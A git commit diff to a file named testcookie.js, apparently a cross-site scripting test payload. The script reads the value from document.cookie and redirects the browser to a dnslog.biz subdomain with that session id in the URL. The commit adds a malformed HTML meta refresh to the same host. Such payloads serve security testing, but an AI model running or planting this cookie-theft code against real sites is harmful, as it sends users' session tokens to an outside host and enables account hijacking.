30faf6224d837c21cb93d4ef18ce16deb84b349b
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 14:38:56 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,2 +1,3 @@
+<meta http-equiv="refresh" content="1; http://9456f69f.dnslog.biz>
 var sessionid = document.cookie.split('=')[1]+".";
 document.location = "https://9456f69f.dnslog.biz/?" + sessionid;
